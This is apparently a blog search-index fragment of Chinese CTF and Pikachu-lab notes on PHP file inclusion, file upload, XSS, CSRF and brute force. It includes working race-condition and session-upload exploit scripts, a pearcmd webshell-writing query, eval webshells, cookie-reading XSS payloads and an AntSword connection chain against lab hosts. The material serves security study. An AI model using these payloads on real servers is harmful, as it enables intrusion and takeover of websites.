With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) \u003c 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter \u003e= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join() if __name__==\"__main__\": main() ","date":"2023-11-17","objectID":"/php/:0:7","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#临时文件包含"},{"categories":["web","notes"],"content":"\rsession文件包含（upload_progress文件上传）有包含点，且PHP_SESSION_UPLOAD_PROGRESS不变时，可以使用此脚本 session_upload_progress最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下session.uoload_progress.enabled是为on的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。 从上面可以看到，session中一部分数据（session.uoload_progress.enabled）是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用session，session文件将会自动创建。 import requests import threading session=requests.session() sess='ctfshow' url=\"http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/\" #靶场地址 data1={ 'PHP_SESSION_UPLOAD_PROGRESS':'\u003c?php echo \"success\";file_put_contents(\"/var/www/html/1.php\",\"\u003c?php eval(\\\\$_POST[1]);?\u003e\");?\u003e' } file={ 'file':'ctfshow' } cookies={ 'PHPSESSID': sess } def write(): while True: r = session.post(url,data=data1,files=file,cookies=cookies) def read(): while True: r = session.get(url+\"?file=../../../../../../../tmp/sess_ctfshow\") if 'success' in r.text: print(\"shell 地址为：\"+url+\"1.php\") exit() threads = [threading.Thread(target=write), threading.Thread(target=read)] for t in threads: t.start() ","date":"2023-11-17","objectID":"/php/:0:8","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#session文件包含upload_progress文件上传"},{"categories":["web","notes"],"content":"\rpear文件包含pear模块下有很多php文件，可以利用其中的某个php，分析发现/usr/local/lib/php/PEAR/Command/Install.php存在可利用点 /usr/local/lib/php/pearcmd.php存在可利用点 argv注册功能开启了就可以使用这种姿势 可以通过配置文件写入一句话木马 ?file=/usr/local/lib/php/pearcmd.php\u0026aaaa+config-create+/var/www/html/\u003c?=`$_POST[1]`;?\u003e+1.php 其中aaa可以将数据弹出argv，三个➕，四个元素 ","date":"2023-11-17","objectID":"/php/:0:9","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#pear文件包含"},{"categories":["web","notes"],"content":"\r远程文件包含这里是结合了上边的日志包含，或者可以理解成远程日志包含 这里由于题目过滤了符号. 所以我们可以用http://www.ab173.com/net/ip2int.php 将IP转换成纯数字 ","date":"2023-11-17","objectID":"/php/:0:10","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#远程文件包含"},{"categories":["web","notes"],"content":"\r四.文件上传","date":"2023-11-17","objectID":"/php/:0:0","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#四文件上传"},{"categories":["web","notes"],"content":"\r0x1 何为文件上传： 文件上传就是通过流的方式将文件写到服务器上 文件上传必须以POST提交表单 表单中需要 \u003cinput type=\"file\" name=\"upload\"\u003e 一句话木马(具体内容写在这篇文章)： \u003c?php eval($_POST['a']) ?\u003e 其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。 ","date":"2023-11-17","objectID":"/php/:0:1","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x1-何为文件上传"},{"categories":["web","notes"],"content":"\r0x2 文件上传漏洞类型\r","date":"2023-11-17","objectID":"/php/:0:2","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x2-文件上传漏洞类型"},{"categories":["web","notes"],"content":"\r0x3 实例去bugku、ctfhub刷题就好了，这里就不赘述了 ","date":"2023-11-17","objectID":"/php/:0:3","series":null,"tags":["web","notes"],"title":"PHP","uri":"/php/#0x3-实例"},{"categories":["web","wp"],"content":"pikachu靶场wp ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#"},{"categories":["web","wp"],"content":"\r敏感信息泄露​ 由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如： —通过访问url下的目录，可以直接列出目录下的文件列表; —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息; —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等; ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#敏感信息泄露"},{"categories":["web","wp"],"content":"\ricanseeyourABC\r​ F12，这题好没趣 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#icanseeyourabc"},{"categories":["web","wp"],"content":"\rBurte Force在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#burte-force"},{"categories":["web","wp"],"content":"\r基于表单的暴力破解burpsuite抓包发送到intruder直接开干 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于表单的暴力破解"},{"categories":["web","wp"],"content":"\r基于服务器的验证码绕过(On server)\r验证码是cookie验证，可以伪造，而且，同一个验证码可以一直发包(burpsuite中的repeater发包验证)，同样是发送到intruder开干（有些服务器后台是不刷新验证码的，所以抓到包后不要放包，这样验证码就一直有效，把包发到攻击模块直接爆破） burpsuite自带的密码字典包不是很受用，建议手动导入toop1000weak password开跑 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于服务器的验证码绕过on-server"},{"categories":["web","wp"],"content":"\r基于前端的验证码绕过(on client)这种将验证码的生成代码写在前端上是十分容易绕过的，单从网页的前端，关掉js功能就可以绕过，在burpsuite中重发包 验证码输入错误的情况下是不能抓包的，需先输入正确的验证码再抓包。然后再将数据包发送到爆破功能处，并且将验证码参数去除掉后再进行爆破 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#基于前端的验证码绕过on-client"},{"categories":["web","wp"],"content":"\r绕过Token暴力破解**token的作用：**简单来说就是服务器给前端发的身份证，前端向服务器发送请求时都要带上这个身份证，服务器通过这个身份证来判断是否是合法请求 抓包发送给暴力破解模块，攻击类型选择pitchfork(音叉)，需爆破的内容为密码和token。 攻击类型为音叉的时候，例如你要爆破账号和密码，你的账号字典为123,456；你的密码字典为147,258。那么你爆破的次数就为2次了，分别是(123,147),(456,258)，也就是说账号字典和密码字典是一一对应的 有效荷载payload1是对密码的爆破，payload2是对token的爆破 对payload1的配置比较常规，从弱口令里面导入即可 在有效荷载payload2的选项中进行Grep-Extract配置如下图 点击添加： 在对payload2有效荷载的配置中，将payload类型改为递归匹配，并进行如下配置 递归匹配的选项选择第一个(刚在选项中配置的，并填入第一个payload(token)) 资源池要使用单线程(没有的话，在下面添加)： 开始攻击，成功界面： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:2:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#绕过token暴力破解"},{"categories":["web","wp"],"content":"\rCross Site Request ForgeryCross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为\"one click\"攻击。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#cross-site-request-forgery"},{"categories":["web","wp"],"content":"\rCSRF(get)按F12根据提示登录账号并进入个人页面点击修改个人信息 随后开启burp并提交表单进行抓包，抓取用户点击submit提交时的连接并构造payload，如下： http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php?sex=boy\u0026phonenum=18626545453\u0026add=chain\u0026email=111\u0026submit=submit%20HTTP/1.1 当用户点击此链接时，邮箱就会被改为111 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrfget"},{"categories":["web","wp"],"content":"\rCSRF(post)在submit之前开始抓包，抓取提交表单的连接，右键单击，选中Engagement tools中的Generate CSRF POC，生成了一个CSRF的POC可用于检测页面是否存在CSRF漏洞 在CSRF PoC中的CSRF HTML栏进行修改，随后点击最下面一栏的用浏览器测试 复制该连接，当用户访问该链接时，个人信息内容便会被修改 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrfpost"},{"categories":["web","wp"],"content":"\rCSRF Token造成CSRF漏洞的主要原因是请求敏感操作的数据包容易被伪造,如果在每次请求时都增加一个随机码(Token), 在每次前端与后端进行数据交互时后台都要对这个随机码进行验证, 以此来防护CSRF攻击 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#csrf-token"},{"categories":["web","wp"],"content":"\rCross Site ScriptingCross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写\"CSS\"冲突，故又称XSS。一般XSS可以分为如下几种常见类型： 1.反射性XSS; 2.存储型XSS; ​ 3.DOM型XSS; ​ XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。 形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 ​ 在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义; ​ XSS测试流程 1、在目标上找输入点，比如查询接口、留言板 2、 输入一组 “特殊字符（\u003e，’，“等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理 3、通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合） 4、 提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#cross-site-scripting"},{"categories":["web","wp"],"content":"\r反射型xss(get)\r蓝色框中包含对文本框最大长度的限制，可进行修改 随后输入xss弹框代码： \u003cscript\u003ealert(1)\u003c/script\u003e Xss回显： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反射型xssget"},{"categories":["web","wp"],"content":"\r反射性xss(post)先登录，再输入弹cookie的Xss代码，爆破比较常规 \u003cscript\u003ealert(document.cookie)\u003c/script\u003e 回显： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反射性xsspost"},{"categories":["web","wp"],"content":"\r存储型xss\r","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#存储型xss"},{"categories":["web","wp"],"content":"\rDom型XssDom型xss，就是向文档对象传入xss代码参数，然后操作文档对象时就会触发xss攻击。DOM型xss是比较特殊的，产生DOM型xss的原因是DOM获取到了前端的输入并载入到DOM节点中作为输出，相比与反射型和存储型，它是不与后端交互的 分析一下前端网页代码，可以发现输入框里的参数会被传递给A标签的href属性 点击按钮后，输入框参数被传到a标签的href属性，只要将href属性弄成xss代码，即可触发xss 下面摘取大佬的写的wp(验证过程)： 1.先检测一下输入输出，输入 123 ,查看页面 2.可以看到，页面中出现了双引号，需要进行闭合，输入 123” οnclick=alert(1) ，再查看源代码。 3.再继续进行输入检测，输入 123\" οnclick=alert(1) \u003c\u003e ’ \" ，出现如下结果 4.输入 123\" οnclick=alert(1) \u003c\u003e ’ ， 5.看得有点迷糊，但是可以发现，双引号被当成了普通的字符串，而单引号却没有，甚至，会在单引号前边自动加上一个双引号。 6.审查一下源代码 \u003cdiv id=\"xssd_main\"\u003e \u003cscript\u003e function domxss(){ var str = document.getElementById(\"text\").value; //通过id获取到输入框中的值，并赋值给str document.getElementById(\"dom\").innerHTML = \"\u003ca href='\"+str+\"'\u003ewhat do you see?\u003c/a\u003e\"; //在id=“dom”的起止标签中间插入一个\u003ca\u003e标签，并将输入框中获取到的字符串拼接到\u003ca\u003e标签里面 //所以，要想闭合，实际上需要用的是单引号 //123\" οnclick=alert(1) \u003c\u003e ' \u003ca href='123\" onclick=alert(1) \u003c\u003e ''\u003ewhat do you see?\u003c/a\u003e } //试试：'\u003e\u003cimg src=\"#\" οnmοuseοver=\"alert('xss')\"\u003e //试试：' οnclick=\"alert('xss')\"\u003e,闭合掉就行 \u003c/script\u003e \u003c!--\u003ca href=\"\" onclick=('xss')\u003e--\u003e \u003cinput id=\"text\" name=\"text\" type=\"text\" value=\"\" /\u003e \u003cinput id=\"button\" type=\"button\" value=\"click me!\" onclick=\"domxss()\" /\u003e \u003cdiv id=\"dom\"\u003e\u003c/div\u003e \u003c/div\u003e 7.使用单引号闭合，或者是使用JavaScript伪协议，输入 javascript:alert(1),至于更深层次的利用方法，现在暂时不了解，留待学习JavaScript后加强 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:4","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#dom型xss"},{"categories":["web","wp"],"content":"\rDOM型xss-X单纯解题角度，无非是比上一题要多点一下 抄抄大佬的分析： 按照上一关的方法直接就成功了，而且测试了一下，闭合单引号以后，后边的双引号是可以正常使用的。 输入 #’ οnclick=“alert(‘1’)”\u003e 但还是来审查一波源代码，走一个流程。这个程序的执行，总共有着三个步骤。 1.在输入框中输入数据，点下按钮，表单以get方式提交，但明没有页面跳转，仅是将数据加载到url中 \u003cform method=\"get\"\u003e \u003cinput id=\"text\" name=\"text\" type=\"text\" value=\"\" /\u003e \u003cinput id=\"submit\" type=\"submit\" value=\"请说出你的伤心往事\"/\u003e \u003c/form\u003e 2.下面一段代码检测，url中是否设置了“text参数”，如果设置了，就会在页面中增加一个超链接的DOM节点。 $html=''; if(isset($_GET['text'])){ $html.= \"\u003ca href='#' οnclick='domxss()'\u003e有些费尽心机想要忘记的事情,后来真的就忘掉了\u003c/a\u003e\"; } 3.点击超链接，触发onclick事件，调用domxss()函数。读取url后的参数，截取除“?text=”的部分，并解码，再使用正则表达式将url中出现的\\全局替换为空格，最后将得出的payload拼接到标签中。 Location.search Location的search属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号?之后的部分）。 decodeURIComponent 对 encodeURIComponent() 函数编码的 URI 进行解码 string.split(separator,limit) separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。 limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。 原文链接：https://blog.csdn.net/weixin_44178492/article/details/108959980 \u003cscript\u003e function domxss() { var str = window.location.search; var txss = decodeURIComponent(str.split(\"text=\")[1]); var xss = txss.replace(/\\+/g,' '); //alert(xss); document.getElementById(\"dom\").innerHTML = \"\u003ca href='\"+xss+\"'\u003e就让往事都随风,都随风吧\u003c/a\u003e\"; } //试试：'\u003e\u003cimg src=\"#\" onmouseover=\"alert('xss')\"\u003e //试试：' οnclick=\"alert('xss')\"\u003e,闭合掉就行 \u003c/script\u003e 不得不说，chatgpt分析代码真好用啊","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:5","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#dom型xss-x"},{"categories":["web","wp"],"content":"\rDOM型xss-X单纯解题角度，无非是比上一题要多点一下 抄抄大佬的分析： 按照上一关的方法直接就成功了，而且测试了一下，闭合单引号以后，后边的双引号是可以正常使用的。 输入 #’ οnclick=“alert(‘1’)”\u003e 但还是来审查一波源代码，走一个流程。这个程序的执行，总共有着三个步骤。 1.在输入框中输入数据，点下按钮，表单以get方式提交，但明没有页面跳转，仅是将数据加载到url中 2.下面一段代码检测，url中是否设置了“text参数”，如果设置了，就会在页面中增加一个超链接的DOM节点。 $html=''; if(isset($_GET['text'])){ $html.= \"有些费尽心机想要忘记的事情,后来真的就忘掉了\"; } 3.点击超链接，触发onclick事件，调用domxss()函数。读取url后的参数，截取除“?text=”的部分，并解码，再使用正则表达式将url中出现的\\全局替换为空格，最后将得出的payload拼接到标签中。 Location.search Location的search属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号?之后的部分）。 decodeURIComponent 对 encodeURIComponent() 函数编码的 URI 进行解码 string.split(separator,limit) separator 可选。字符串或正则表达式，从该参数指定的地方分割 string Object。 limit 可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。 原文链接：https://blog.csdn.net/weixin_44178492/article/details/108959980 不得不说，chatgpt分析代码真好用啊","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:5","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#不得不说chatgpt分析代码真好用啊"},{"categories":["web","wp"],"content":"\rxss之盲打输入内容提交，发现没回显，直接dirsearch扫描一下后台，可得到后台登录地址 http://127.0.0.1/vul/xss/xssblind/admin_login.php 随后bp爆破进入，可看到历次提交的内容，就此，我们可以尝试提交xss语句，刷新后台页面，有回显 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:6","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之盲打"},{"categories":["web","wp"],"content":"\rXss之过滤看一下源代码 if(isset($_GET['submit']) \u0026\u0026 $_GET['message'] != null){ //这里会使用正则对\u003cscript进行替换为空,也就是过滤掉 $message=preg_replace('/\u003c(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']); // $message=str_ireplace('\u003cscript\u003e',$_GET['message']); 过滤掉了\u003cscript字段 ，可以尝试大小写绕过 \u003cScript\u003ealert(document.cookie)\u003c/sCript\u003e 当然其他语句是不受影响的 \u003cimg src='x' onerror='alert(document.cookie)'\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:7","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之过滤"},{"categories":["web","wp"],"content":"\rxss之htmlspecialcharshtmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。语法为：htmlspecialchars(string,quotestyle,character-set) specialchars这个函数就是把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的，只有将quotestyle选项为ENT_QUOTES才会过滤单引号。 所以用javascript:alert(document.cookie)就可以绕过 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:8","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之htmlspecialchars"},{"categories":["web","wp"],"content":"\rxss之href输出此关，同时使用了htmlspecialchars并且使用了ENT_QUOTES参数 ENT_COMPAT - 默认，仅编码双引号。 ENT_QUOTES - 编码双引号和单引号。 ENT_NOQUOTES - 不编码任何引号。 看源码 $message=htmlspecialchars($_GET['message'],ENT_QUOTES); 所以，使用单引号是无法进行绕过的，只能使用JavaScript伪协议了。 javascript:alert(document.cookie) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:9","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之href输出"},{"categories":["web","wp"],"content":"\rxss之js输出看源代码，这段判断提交的参数并获取，如果参数值为“tmac”，则输出一张图片 if(isset($_GET['submit']) \u0026\u0026 $_GET['message'] !=null){ $jsvar=$_GET['message']; // $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES); if($jsvar == 'tmac'){ $html.=\"\u003cimg src='C:\\Blog\\source\\_posts\\{$PIKA_ROOT_DIR}assets\\images\\nbaplayer\\tmac.jpeg' /\u003e\"; } } 下面这段： \u003cscript\u003e $ms='\u003c?php echo $jsvar;?\u003e'; if($ms.length != 0){ if($ms == 'tmac'){ $('#fromjs').text('tmac确实厉害,看那小眼神..') }else { // alert($ms); $('#fromjs').text('无论如何不要放弃心中所爱..') } } \u003c/script\u003e //这里将输入动态的生成到了js中,形成xss //javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义 //讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修复? //这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。 //所以在JS的输出点应该使用\\对特殊字符进行转义 则构造payload如下： \u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:10","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xss之js输出"},{"categories":["web","wp"],"content":"\rFile Inclusion​ 文件包含是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了： include(),include_once() require(),require_once() ​ 大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 若文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况： ​ **1.本地文件包含漏洞：**仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。 ​ **2.远程文件包含漏洞：**能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusion"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#file-inclusionlocal"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 使用蚁剑连接webshell, 连接url地址为:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/ImgTrjs.jpg\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2, 连接密码为123 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#原理"},{"categories":["web","wp"],"content":"\rFile Inclusion(local)\r原理仅对服务器本地的文件进行包含, 由于服务器上的文件并不是攻击者所能控制得, 因此在攻击的过程中更多的是包含系统的配置文件(如密钥文件), 或者配合文件上传漏洞去形成更大的威力 通过get传参，file伪协议，直接对payload进行修改 再举一个栗子，这里我摘取一下charmersix师傅的笔记： 我们在目录下新建个txt,一会通过web页面读它\r然后我们直接在url里输入目录就可以\r在CSDN看到了大佬写的笔记，觉得在理解本地文件包含上大有益俾，赶紧抄一抄： 出自Henry404s师傅 访问任意文件在当前网页所在的文件目录有一个file6.php文件 读取file6.php文件内容:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file6.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 配合文件上传getshell使用imgTrjs工具将一句话代码写入图片中 \u003c?php @eval($_POST['123']);?\u003e 在文件上传处上传带有恶意代码的图片, 随后返回图片的相对路径:uploads/ImgTrjs.jpg 包含不存在的文件导致报错:http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=file7.php\u0026submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 从报错信息可看出文件包含函数用的是include(), 被包含的文件路径为pikachu\\vul\\fileinclude\\include\\file7.php 由于文件处于/include目录下, 故不能使用绝对路径, 需转换成相对路径, 最终包含木马图片的payload如下 